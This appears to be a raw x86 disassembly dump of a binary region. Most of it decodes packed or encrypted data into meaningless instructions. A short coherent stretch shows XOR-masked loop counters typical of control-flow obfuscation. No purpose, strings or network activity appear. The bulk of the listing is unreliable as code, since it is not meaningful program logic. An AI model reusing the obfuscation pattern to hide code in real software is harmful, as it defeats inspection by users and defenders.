  41eb91:	sbb    bl,BYTE PTR [ebx+eiz*4+0x75a613a2]
  41eb98:	(bad)  [edx-0x187b529d]
  41eb9e:	sub    al,bl
  41eba0:	aam    0x68
  41eba2:	mov    dl,BYTE PTR [ebx+0x5a191758]
  41eba8:	cmp    al,0x4f
  41ebaa:	div    DWORD PTR [esi+0x4de499fa]
  41ebb0:	sub    cl,BYTE PTR ds:0x97311565
  41ebb6:	loopne 0x41ec25
  41ebb8:	sbb    al,0x15
  41ebba:	pop    esi
  41ebbb:	push   ebx
  41ebbc:	mov    esp,0x21363a1e
  41ebc1:	stc    
  41ebc2:	xor    DWORD PTR [ebp-0x77],ecx
  41ebc5:	mov    cl,0x87
  41ebc7:	pop    esp
  41ebc8:	cwde   
  41ebc9:	adc    DWORD PTR [eax],ecx
  41ebcb:	test   DWORD PTR [ebp+ecx*1-0x3d],ebp
  41ebcf:	dec    ecx
  41ebd0:	hlt    
  41ebd1:	add    al,0xdd
  41ebd3:	pushf  
  41ebd4:	and    eax,0x373f0ccc
  41ebd9:	mov    ds:0x3dc39474,eax
  41ebde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebdf:	mov    ebp,0xdb655b27
  41ebe4:	bsr    eax,edx
  41ebe7:	aas    
  41ebe8:	mov    edi,DWORD PTR [eax+edx*4-0x17c20635]
  41ebef:	push   ebx
  41ebf0:	cwde   
  41ebf1:	fnstenv [ebp-0x605c6333]
  41ebf7:	stos   DWORD PTR es:[edi],eax
  41ebf8:	push   es
  41ebf9:	mov    ch,BYTE PTR [eax]
  41ebfb:	inc    ebx
  41ebfc:	js     0x41ebbc
  41ebfe:	cmp    al,0x7f
  41ec00:	xchg   esi,eax
  41ec01:	mov    edi,DWORD PTR [ebp+0x2]
  41ec04:	push   edi
  41ec05:	pop    edx
  41ec06:	push   ebx
  41ec07:	ja     0x41ebba
  41ec09:	cs loop 0x41ebfa
  41ec0c:	popf   
  41ec0d:	mov    dl,0xbb
  41ec0f:	xor    dh,dh
  41ec11:	mulps  xmm3,XMMWORD PTR [ecx-0x4400fef0]
  41ec18:	fbstp  TBYTE PTR [esi-0x15884db5]
  41ec1e:	mov    ebx,0x49d70ca5
  41ec23:	out    dx,eax
  41ec24:	arpl   WORD PTR [edi],dx
  41ec26:	retf   
  41ec27:	xor    BYTE PTR [ecx],bh
  41ec29:	nop
  41ec2a:	xchg   cl,dl
  41ec2c:	pop    esi
  41ec2d:	in     eax,0x73
  41ec2f:	fistp  WORD PTR [ecx]
  41ec31:	cmp    DWORD PTR [ebx-0x6c],0x7
  41ec35:	and    BYTE PTR [edx+0x2d1e3ea8],bl
  41ec3b:	mov    ah,0x4d
  41ec3d:	or     al,BYTE PTR [ebx]
  41ec3f:	add    esi,DWORD PTR [eiz*8-0x9a98c06]
  41ec46:	mov    eax,ds:0xcd47ab92
  41ec4b:	jo     0x41ec9b
  41ec4d:	and    al,0xd6
  41ec4f:	ret    0x1432
  41ec52:	xor    DWORD PTR [ebp+0x46ce4d19],edi
  41ec58:	sub    eax,0xa3372dd2
  41ec5d:	xchg   BYTE PTR ds:0x99295d61,ah
  41ec63:	and    al,0xfa
  41ec65:	(bad)  
  41ec66:	mov    cl,0x25
  41ec68:	pop    DWORD PTR [edx-0x6c]
  41ec6b:	mul    DWORD PTR [edx-0x7000cc91]
  41ec71:	aaa    
  41ec72:	xor    bl,BYTE PTR [ebp+0x5a]
  41ec75:	dec    esp
  41ec76:	fsubr  QWORD PTR [ebx]
  41ec78:	dec    edx
  41ec79:	push   esi
  41ec7a:	stos   DWORD PTR es:[edi],eax
  41ec7b:	mov    ebx,0x5f30442e
  41ec80:	cmp    DWORD PTR [edi-0x6f],ebx
  41ec83:	das    
  41ec84:	int3   
  41ec85:	xchg   esi,eax
  41ec86:	hlt    
  41ec87:	add    eax,0xf5212c66
  41ec8c:	push   ecx
  41ec8d:	sbb    eax,0xa856d56a
  41ec92:	ret    0x4fbe
  41ec95:	xchg   DWORD PTR [edi],ecx
  41ec97:	push   esp
  41ec98:	jb     0x41ec4b
  41ec9a:	and    eax,0x28306622
  41ec9f:	xor    eax,DWORD PTR [edx+0x4fc7032c]
  41eca5:	cmp    eax,0x64569007
  41ecaa:	pop    ecx
  41ecab:	inc    esi
  41ecac:	inc    eax
  41ecad:	fisub  WORD PTR [ebx-0x57]
  41ecb0:	sbb    BYTE PTR [eax+0x40],0xfb
  41ecb4:	sbb    al,0xca
  41ecb6:	mov    ebx,0x99232ff4
  41ecbb:	icebp  
  41ecbc:	ja     0x41ec89
  41ecbe:	leave  
  41ecbf:	sbb    ecx,eax
  41ecc1:	dec    esi
  41ecc2:	scas   eax,DWORD PTR es:[edi]
  41ecc3:	sub    BYTE PTR [ebx+0x64],bh
  41ecc6:	mov    eax,0x757d9d71
  41eccb:	or     bh,BYTE PTR [ebp+0x1a]
  41ecce:	sub    edx,DWORD PTR [edx]
  41ecd0:	sahf   
  41ecd1:	push   eax
  41ecd2:	jg     0x41ed42
  41ecd4:	test   BYTE PTR fs:[eax+0x5f1e80b8],dh
  41ecdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecdc:	jl     0x41ece2
  41ecde:	mov    bh,0x40
  41ece0:	test   eax,0xdef6d0fc
  41ece5:	loope  0x41ec82
  41ece7:	test   BYTE PTR [edx+0x7316a5b8],dh
  41eced:	push   ds
  41ecee:	outs   dx,DWORD PTR ds:[esi]
  41ecef:	dec    ebp
  41ecf0:	std    
  41ecf1:	ins    DWORD PTR es:[edi],dx
  41ecf2:	repnz fwait
  41ecf4:	sbb    eax,DWORD PTR [eax+0x15713f5e]
  41ecfa:	or     bh,BYTE PTR [edx-0x7a98da3b]
  41ed00:	xor    ebp,ebx
  41ed02:	sbb    BYTE PTR [ecx+0x75],al
  41ed05:	out    0x91,eax
  41ed07:	loop   0x41ece2
  41ed09:	xor    esi,DWORD PTR [edx-0x70eadbde]
  41ed0f:	inc    ecx
  41ed10:	lods   eax,DWORD PTR ds:[esi]
  41ed11:	scas   al,BYTE PTR es:[edi]
  41ed12:	stc    
  41ed13:	jb     0x41ed87
  41ed15:	sahf   
  41ed16:	fisub  DWORD PTR [ebp-0x19]
  41ed19:	add    al,0x96
  41ed1b:	cld    
  41ed1c:	adc    bh,BYTE PTR ds:0xec623c0b
  41ed22:	inc    ecx
  41ed23:	jnp    0x41ed3b
  41ed25:	add    BYTE PTR [esi-0x3f2f6af9],bl
  41ed2b:	push   eax
  41ed2c:	add    eax,0xb3d3aed8
  41ed31:	mov    ebx,0x24ebc8cb
  41ed36:	das    
  41ed37:	sub    al,0x24
  41ed39:	sbb    bh,BYTE PTR [edx+0x69]
  41ed3c:	ret    0xb4d2
  41ed3f:	sbb    dl,BYTE PTR [ebx+ebx*8-0x5fb62713]
  41ed46:	pop    eax
  41ed47:	test   al,0x9e
  41ed4a:	icebp  
  41ed4b:	mov    al,ds:0xc5e8f850
  41ed50:	nop
  41ed51:	fiadd  DWORD PTR [ecx]
  41ed53:	jbe    0x41ed5d
  41ed55:	and    al,BYTE PTR [ecx]
  41ed57:	jmp    0x41ece5
  41ed59:	sub    eax,0xa4f7b65c
  41ed5e:	(bad)  [edx+0x19c9fca9]
  41ed64:	jl     0x41ed52
  41ed66:	hlt    
  41ed67:	xchg   ebx,eax
  41ed68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed69:	test   eax,0x4f3cb264
  41ed6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed6f:	add    edi,DWORD PTR [ebp+0x77e57e5e]
  41ed75:	adc    BYTE PTR [ecx],ch
  41ed77:	cli    
  41ed78:	ds mov bh,0xbc
  41ed7b:	mov    ebp,0x99866b4f
  41ed80:	mov    BYTE PTR [ebp-0x1a],cl
  41ed83:	jne    0x41ed4f
  41ed85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed86:	ds arpl bx,ax
  41ed89:	out    0x4f,eax
  41ed8b:	mov    DWORD PTR [ecx+edi*8],eax
  41ed8e:	scas   al,BYTE PTR es:[edi]
  41ed8f:	cmp    al,0xc3
  41ed91:	mov    ds:0x471a8143,eax
  41ed96:	lods   al,BYTE PTR ds:[esi]
  41ed97:	addr16 mov eax,ds:0x9e50
  41ed9b:	or     BYTE PTR [ecx+esi*8],dh
  41ed9e:	call   0x96070cec
  41eda3:	clc    
  41eda4:	sti    
  41eda5:	and    eax,ecx
  41eda7:	ja     0x41ed49
  41eda9:	sbb    DWORD PTR [ebx+0x53afcd94],ecx
  41edaf:	iret   
  41edb0:	push   edi
  41edb1:	fwait
  41edb2:	imul   edi,DWORD PTR [ecx-0x1f5e0bae],0x24be64d1
  41edbc:	cmp    ch,BYTE PTR [edi-0x521ff8e5]
  41edc2:	inc    ecx
  41edc3:	jo     0x41ed7f
  41edc5:	aad    0x92
  41edc7:	(bad)  
  41edc8:	enter  0xc914,0x81
  41edcc:	or     al,0x4b
  41edce:	fnstcw WORD PTR [eax+eax*1-0x6218a5da]
  41edd5:	mov    ah,0x8d
  41edd7:	pop    ebp
  41edd8:	ins    DWORD PTR es:[edi],dx
  41edd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edda:	fsub   QWORD PTR ds:0xd5163931
  41ede0:	test   edi,edi
  41ede2:	xchg   BYTE PTR es:[esi],al
  41ede5:	jmp    0x41ee3a
  41ede7:	jle    0x41ee43
  41ede9:	cmp    eax,0xa3788908
  41edee:	jecxz  0x41eda0
  41edf0:	mov    dl,0xc3
  41edf2:	outs   dx,DWORD PTR ds:[esi]
  41edf3:	int3   
  41edf4:	sbb    DWORD PTR [edi],esi
  41edf6:	dec    ebp
  41edf7:	inc    edx
  41edf8:	mov    ch,0x12
  41edfa:	aam    0xe6
  41edfc:	mov    ah,0x5d
  41edfe:	(bad)  
  41edff:	cmp    ch,BYTE PTR [edx]
  41ee01:	inc    edi
  41ee02:	cmp    BYTE PTR [esi],0xa8
  41ee05:	or     DWORD PTR [edi+0x65],ebx
  41ee08:	ss jns 0x41ee3e
  41ee0b:	les    edx,FWORD PTR [eax]
  41ee0d:	imul   BYTE PTR [edi+0x10edd098]
  41ee13:	push   esi
  41ee14:	dec    ecx
  41ee15:	jo     0x41edb7
  41ee17:	push   ebx
  41ee18:	inc    esi
  41ee19:	mov    bh,0x18
  41ee1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee1c:	icebp  
  41ee1d:	cld    
  41ee1e:	pop    ebp
  41ee1f:	dec    edi
  41ee20:	jno    0x41edf3
  41ee22:	popf   
  41ee23:	int3   
  41ee24:	mov    ds,WORD PTR [edi-0x4612446]
  41ee2a:	test   BYTE PTR [bx+si],bl
  41ee2d:	jns    0x41ee93
  41ee2f:	outs   dx,BYTE PTR ds:[esi]
  41ee30:	add    BYTE PTR [ebp+0x54d7859a],bl
  41ee36:	je     0x41ee6f
  41ee38:	test   eax,0x5e00ccad
  41ee3d:	mov    fs:0xbbe5827a,al
  41ee43:	dec    edi
  41ee44:	xchg   edi,eax
  41ee45:	fisttp WORD PTR [edi]
  41ee47:	das    
  41ee48:	jae    0x41ee0e
  41ee4a:	mov    DWORD PTR [edx+ecx*4+0x56dbab14],ecx
  41ee51:	out    dx,al
  41ee52:	push   0x4b
  41ee54:	and    al,0x96
  41ee56:	test   bh,bl
  41ee58:	sub    al,cl
  41ee5a:	mov    ah,BYTE PTR [edx]
  41ee5c:	xchg   esp,eax
  41ee5d:	mov    BYTE PTR [esi+0x19],al
  41ee60:	fs loopne 0x41eed3
  41ee63:	aaa    
  41ee64:	sar    dl,1
  41ee66:	mov    edi,0xad597418
  41ee6b:	sbb    al,0xf1
  41ee6d:	bound  esi,QWORD PTR [ecx-0xfd5998d]
  41ee73:	mov    ecx,0x77017203
  41ee78:	inc    ebp
  41ee79:	fcmovbe st,st(5)
  41ee7b:	imul   ebp,DWORD PTR [ecx-0x1e737ae8],0x82b91e0a
  41ee85:	test   eax,0xb86b8fd
  41ee8a:	stc    
  41ee8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee8c:	jb     0x41ee51
  41ee8e:	mov    al,0x2d
  41ee90:	cmp    BYTE PTR [ebp+0x5abd1965],al
  41ee96:	pushf  
  41ee97:	pushf  
  41ee98:	push   0xffffff8b
  41ee9a:	hlt    
  41ee9b:	fs pop edi
  41ee9d:	xchg   edi,eax
  41ee9e:	mov    ecx,ecx
  41eea0:	pop    eax
  41eea1:	aaa    
  41eea2:	imul   esi,DWORD PTR [edi-0x7b1c5ebc],0x6ffcb9c3
  41eeac:	adc    ch,BYTE PTR [edx+0x7ea6fa5c]
  41eeb2:	fdiv   DWORD PTR [ebx+0x4c]
  41eeb5:	mov    eax,ds:0x7215d25a
  41eeba:	and    BYTE PTR [ecx+0x2f],al
  41eebd:	popf   
  41eebe:	sub    DWORD PTR [eax+esi*1-0x66],esp
  41eec2:	pusha  
  41eec3:	mov    ?,WORD PTR [esi+0x16]
  41eec6:	lock add eax,0xa95def9c
  41eecc:	xchg   ebx,eax
  41eecd:	in     al,0xb9
  41eecf:	mov    DWORD PTR [ebp+0x52],esi
  41eed2:	test   DWORD PTR [esi],ebx
  41eed4:	xchg   ebp,eax
  41eed5:	cdq    
  41eed6:	jo     0x41ef17
  41eed8:	repnz sbb eax,0x763a0f50
  41eede:	pop    esp
  41eedf:	test   esi,edi
  41eee1:	mov    edi,0xd94a1482
  41eee6:	pop    ebp
  41eee7:	ja     0x41eea2
  41eee9:	jo     0x41ef0c
  41eeeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeec:	jmp    0x6c66:0x5fc08169
  41eef3:	cli    
  41eef4:	and    DWORD PTR [ebx-0x23],ecx
  41eef7:	mov    ch,0xb1
  41eef9:	aam    0xae
  41eefb:	outs   dx,DWORD PTR ds:[esi]
  41eefc:	pop    edx
  41eefd:	sbb    ch,al
  41eeff:	(bad)  
  41ef00:	mov    es,WORD PTR [eax]
  41ef02:	add    BYTE PTR [edi+0x16],ch
  41ef05:	or     al,BYTE PTR [eax+0x6c]
  41ef08:	ins    BYTE PTR es:[edi],dx
  41ef09:	mov    al,0xb2
  41ef0b:	cmp    BYTE PTR [edi+0x67],ch
  41ef0e:	cwde   
  41ef0f:	xor    ah,BYTE PTR ds:0x35ee3f9b
  41ef15:	hlt    
  41ef16:	cmp    esi,ebp
  41ef18:	lds    esi,FWORD PTR [esi-0x80]
  41ef1b:	mov    ds:0x57c031b1,al
  41ef20:	mov    al,ds:0xc1af6e6c
  41ef25:	ror    DWORD PTR [ebx],cl
  41ef27:	xchg   esp,eax
  41ef28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef29:	sub    al,0xf3
  41ef2b:	xchg   BYTE PTR [edx],dl
  41ef2d:	jno    0x41ef9c
  41ef2f:	xchg   edx,eax
  41ef30:	(bad)  
  41ef31:	mov    ebx,0x16476fe4
  41ef36:	neg    DWORD PTR [eax+0x34647066]
  41ef3c:	rcl    BYTE PTR [ecx+0x7619ea03],cl
  41ef42:	sub    DWORD PTR [edi+0x7f],edx
  41ef45:	or     eax,DWORD PTR [ebx-0x46d2139c]
  41ef4b:	aad    0x5d
  41ef4d:	mov    eax,ds:0x57505506
  41ef52:	xor    cl,BYTE PTR [ebp+0x56f336d]
  41ef58:	xchg   ecx,eax
  41ef59:	mov    WORD PTR [edi-0x43],ss
  41ef5c:	xchg   esi,eax
  41ef5d:	loope  0x41efaa
  41ef5f:	mov    ds:0xd80ef62a,al
  41ef64:	mov    al,0x6a
  41ef66:	jne    0x41ef5a
  41ef68:	jg     0x41efe5
  41ef6a:	addr16 jne 0x41ef53
  41ef6d:	push   esp
  41ef6e:	and    bh,BYTE PTR [eax+0xd9188a1]
  41ef74:	lea    esi,[edi]
  41ef76:	xor    DWORD PTR [ebx+0x2fc1d0ff],eax
  41ef7c:	fldenv [edi+0x5ee60c6b]
  41ef82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef83:	enter  0x12c7,0x10
  41ef87:	stos   BYTE PTR es:[edi],al
  41ef88:	cli    
  41ef89:	pop    ecx
  41ef8a:	sbb    edi,eax
  41ef8c:	xchg   DWORD PTR [edx],esp
  41ef8e:	dec    eax
  41ef8f:	lods   eax,DWORD PTR ds:[esi]
  41ef90:	or     ch,BYTE PTR [eax]
  41ef92:	mov    ds:0x3d623d5,al
  41ef97:	mov    cl,0x39
  41ef99:	mov    dl,0x81
  41ef9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef9c:	cmp    al,0xb2
  41ef9e:	sar    BYTE PTR [ebx],0xe
  41efa1:	call   0xc67771ab
  41efa6:	mov    edi,0x45d4ecb4
  41efab:	test   DWORD PTR [ebp+edi*8+0x3c65e52c],eax
  41efb2:	aaa    
  41efb3:	jle    0x41ef5d
  41efb5:	add    cl,BYTE PTR [esi]
  41efb7:	mov    dl,BYTE PTR [edx-0x4674c8f]
  41efbd:	sbb    dh,dh
  41efbf:	cwde   
  41efc0:	jle    0x41ef4f
  41efc2:	inc    esi
  41efc3:	mov    al,ds:0x41aab4d7
  41efc8:	mov    esi,0xdf512caa
  41efcd:	stos   BYTE PTR es:[edi],al
  41efce:	ss repnz daa 
  41efd1:	mov    BYTE PTR [ecx-0x1f],dh
  41efd4:	scas   eax,DWORD PTR es:[edi]
  41efd5:	push   0x7f
  41efd7:	add    DWORD PTR [edx+0x735057ac],eax
  41efdd:	popa   
  41efde:	sub    BYTE PTR [edx+0xe],bh
  41efe1:	push   edx
  41efe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efe3:	xchg   ebx,eax
  41efe4:	(bad)  
  41efe5:	and    bl,bh
  41efe7:	pop    ebx
  41efe8:	mov    esp,0x560ce6c7
  41efed:	xor    ah,BYTE PTR [esp+ebp*8]
  41eff0:	jnp    0x41efd5
  41eff2:	push   cs
  41eff3:	fwait
  41eff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff5:	ins    DWORD PTR es:[edi],dx
  41eff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eff7:	aad    0x91
  41eff9:	mov    ebp,0x19937090
  41effe:	xor    ecx,eax
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x69706403
  41f0bf:	repnz rcl BYTE PTR [ecx-0x28],1
  41f0c3:	popa   
  41f0c4:	bound  edi,QWORD PTR [edi+ebx*2]
  41f0c7:	bound  esp,QWORD PTR [edx+0x19]
  41f0ca:	in     al,dx
  41f0cb:	repnz loop 0x41f11d
  41f0ce:	stc    
  41f0cf:	jae    0x41f0ed
  41f0d1:	dec    esi
  41f0d2:	(bad)  
  41f0d3:	scas   al,BYTE PTR es:[edi]
  41f0d4:	mov    ds:0x23245ba,eax
  41f0d9:	popf   
  41f0da:	in     al,dx
  41f0db:	inc    esp
  41f0dc:	lods   eax,DWORD PTR ds:[esi]
  41f0dd:	sub    eax,0x999f59c9
  41f0e2:	popa   
  41f0e3:	jmp    0x4213ac89
  41f0e8:	sti    
  41f0e9:	rcl    DWORD PTR [eax-0x2],1
  41f0ec:	push   0x7a921528
  41f0f1:	call   0x98958f30
  41f0f6:	cdq    
  41f0f7:	mov    bl,0x91
  41f0fa:	lods   al,BYTE PTR ds:[esi]
  41f0fb:	jl     0x41f0d1
  41f0fd:	add    esp,DWORD PTR [ebx]
  41f0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f100:	icebp  
  41f101:	retf   
  41f102:	cdq    
  41f103:	or     eax,0x51af9aa2
  41f108:	sbb    DWORD PTR [ebp-0x1581ad74],0xf
  41f10f:	(bad)  
  41f110:	loopne 0x41f155
  41f112:	pop    es
  41f113:	fdivr  st(6),st
  41f115:	xchg   edi,eax
  41f116:	pop    esp
  41f117:	test   al,0x2e
  41f119:	mov    ecx,0x868a21c3
  41f11e:	jecxz  0x41f168
  41f120:	push   ss
  41f121:	in     eax,dx
  41f122:	repz pop ss
  41f124:	test   al,0xae
  41f126:	inc    dx
  41f128:	or     dl,cl
  41f12a:	fwait
  41f12b:	mov    esi,?
  41f12d:	ds (bad) 
  41f12f:	jmp    0x41f105
  41f131:	into   
  41f132:	popa   
  41f133:	fsubp  st(5),st
  41f135:	nop
  41f136:	sbb    dh,bl
  41f138:	gs add al,0xd2
  41f13b:	enter  0xae5d,0x54
  41f13f:	pop    ebp
  41f140:	es push edx
  41f142:	nop
  41f143:	hlt    
  41f144:	pusha  
  41f145:	call   0x5b50:0x74ae50a2
  41f14c:	xchg   esp,eax
  41f14d:	sub    dh,dl
  41f14f:	adc    DWORD PTR [edx-0x37],0xffffffb4
  41f153:	jp     0x41f1b6
  41f155:	cmp    ah,BYTE PTR [ebx]
  41f157:	pcmpeqd mm6,QWORD PTR [eax]
  41f15a:	cmp    al,0xd1
  41f15c:	dec    edx
  41f15d:	and    dh,dh
  41f15f:	enter  0x9083,0x59
  41f163:	adc    esp,eax
  41f165:	push   0x2aea91b1
  41f16a:	xchg   BYTE PTR [edi-0xf1c4a83],bh
  41f170:	rol    DWORD PTR [edi],0x4c
  41f173:	xor    BYTE PTR [edi+0x51],cl
  41f176:	ds jle 0x41f15d
  41f179:	mov    ecx,0x4d3f655b
  41f17e:	add    DWORD PTR [ebp+ebx*2-0x2],ecx
  41f182:	popf   
  41f183:	int3   
  41f184:	call   DWORD PTR [esi]
  41f186:	cmp    DWORD PTR [eax-0x70da1912],ebx
  41f18c:	test   dl,al
  41f18e:	sub    ecx,esp
  41f190:	inc    ebx
  41f191:	and    edx,esi
  41f193:	push   cs
  41f194:	lds    edx,FWORD PTR [edx+ebp*4-0x595682d]
  41f19b:	enter  0x6570,0x40
  41f19f:	div    BYTE PTR [ebx+0x22c21d67]
  41f1a5:	push   edi
  41f1a6:	rol    BYTE PTR cs:[edi-0x5a],1
  41f1aa:	add    ecx,ebp
  41f1ac:	test   BYTE PTR [edi-0x162e0c64],cl
  41f1b2:	jnp    0x41f153
  41f1b4:	leave  
  41f1b5:	cmp    BYTE PTR [eax-0x6f],ch
  41f1b8:	imul   eax,edx,0xffffffc5
  41f1bb:	inc    esi
  41f1bc:	inc    eax
  41f1bd:	cmp    BYTE PTR [esi],bh
  41f1bf:	stc    
  41f1c0:	daa    
  41f1c1:	ret    0x4324
  41f1c4:	enter  0x1d00,0xb4
  41f1c8:	add    ch,BYTE PTR [edx]
  41f1ca:	xor    ecx,DWORD PTR [ecx-0x16]
  41f1cd:	mov    ah,0x9a
  41f1cf:	test   DWORD PTR [edi-0x1ba30956],ebx
  41f1d5:	arpl   bp,di
  41f1d7:	(bad)  
  41f1d8:	in     al,dx
  41f1d9:	imul   eax,DWORD PTR [esi+0xc],0x9e00875f
  41f1e0:	aam    0x43
  41f1e2:	mov    bh,BYTE PTR [eax+0x24]
  41f1e5:	ror    BYTE PTR [ecx],0x65
  41f1e8:	cmp    al,0x90
  41f1ea:	ja     0x41f185
  41f1ec:	adc    eax,0xdbd30f09
  41f1f1:	sbb    eax,ebp
  41f1f3:	cmp    ebp,esp
  41f1f5:	and    BYTE PTR [edx+esi*8+0x1143010e],cl
  41f1fc:	jns    0x41f18f
  41f1fe:	mov    eax,ds:0xd3c8d221
  41f203:	sbb    DWORD PTR [edx-0x32],esi
  41f206:	jo     0x41f1d7
  41f208:	addr16 xor eax,0x50696aa1
  41f20e:	lea    esi,[eax+0x53]
  41f211:	cmp    DWORD PTR [esi+esi*8-0x42],0x35f090f7
  41f219:	in     al,dx
  41f21a:	je     0x41f240
  41f21c:	pushf  
  41f21d:	or     edi,esi
  41f21f:	sbb    edx,ebp
  41f221:	(bad)  
  41f222:	ss mov al,0x5c
  41f225:	xchg   BYTE PTR [edx],cl
  41f227:	push   ds
  41f228:	and    BYTE PTR [esi-0x32],0xc7
  41f22c:	push   ebp
  41f22d:	mul    dh
  41f22f:	jle    0x41f29d
  41f231:	cmp    ch,BYTE PTR [eax+0x57]
  41f234:	sbb    eax,0xb77cc463
  41f239:	jl     0x41f29c
  41f23b:	mov    BYTE PTR [edx],bh
  41f23d:	cmp    cl,ah
  41f23f:	jmp    0x41f271
  41f241:	int    0xab
  41f243:	mov    bh,0x4f
  41f245:	or     cl,BYTE PTR [esi+0x4a1bcc6a]
  41f24b:	inc    esp
  41f24c:	xor    ebx,DWORD PTR [edi]
  41f24e:	inc    edi
  41f24f:	stos   BYTE PTR es:[edi],al
  41f250:	(bad)  
  41f251:	fld    QWORD PTR [ebp+0x2725dc93]
  41f257:	dec    esp
  41f258:	mov    esi,gs
  41f25a:	daa    
  41f25b:	jge    0x41f29f
  41f25d:	pop    esi
  41f25e:	and    eax,0x94f04705
  41f263:	mov    edx,0x49a4d1a4
  41f268:	cmp    DWORD PTR [ebp+0x34971558],0x9438d2ca
  41f272:	mov    ebp,0x8fd0a254
  41f277:	jo     0x41f233
  41f279:	fdiv   st,st(6)
  41f27b:	les    ebx,FWORD PTR [esi-0x2c08593a]
  41f281:	xor    ch,BYTE PTR [eax+0x18f4ec43]
  41f287:	mov    dl,0x52
  41f289:	das    
  41f28a:	jle    0x41f288
  41f28c:	xlat   BYTE PTR ds:[ebx]
  41f28d:	nop
  41f28e:	push   0x37
  41f290:	fs jmp 0xf2c4b23b
  41f296:	out    dx,al
  41f297:	scas   al,BYTE PTR es:[edi]
  41f298:	sub    ebx,DWORD PTR [esp+eiz*8-0x81e202e]
  41f29f:	enter  0x7e76,0x12
  41f2a3:	out    dx,al
  41f2a4:	push   esi
  41f2a5:	or     esi,edx
  41f2a7:	je     0x41f232
  41f2a9:	lahf   
  41f2aa:	adc    eax,0x65dc66bb
  41f2af:	xor    al,0x58
  41f2b1:	shl    DWORD PTR [edx],1
  41f2b3:	dec    ebx
  41f2b4:	pop    esp
  41f2b5:	fwait
  41f2b6:	xchg   ecx,eax
  41f2b7:	mov    esp,0x3046a27
  41f2bc:	and    BYTE PTR [edi+eax*8],0xa2
  41f2c0:	push   esi
  41f2c1:	sbb    BYTE PTR [ebx+ebp*4-0x14],0x35
  41f2c6:	xor    al,0xef
  41f2c8:	xchg   edx,eax
  41f2c9:	push   ss
  41f2ca:	jl     0x41f2ba
  41f2cc:	or     al,0xca
  41f2ce:	lods   al,BYTE PTR ds:[esi]
  41f2cf:	jl     0x41f2e4
  41f2d1:	std    
  41f2d2:	scas   eax,DWORD PTR es:[edi]
  41f2d3:	inc    ecx
  41f2d4:	test   eax,0xc0760b2f
  41f2d9:	mov    al,0xa0
  41f2db:	lds    esi,FWORD PTR [esi+0x44]
  41f2de:	or     eax,0x1301b99
  41f2e3:	out    dx,eax
  41f2e4:	arpl   WORD PTR ds:0x3f490860,bx
  41f2ea:	retf   0x66fd
  41f2ed:	(bad)  
  41f2ee:	and    dl,BYTE PTR [edx-0x4a571836]
  41f2f4:	jecxz  0x41f307
  41f2f6:	jmp    0x41f28a
  41f2f8:	loope  0x41f287
  41f2fa:	cli    
  41f2fb:	call   0x8b104655
  41f300:	cmp    bl,cl
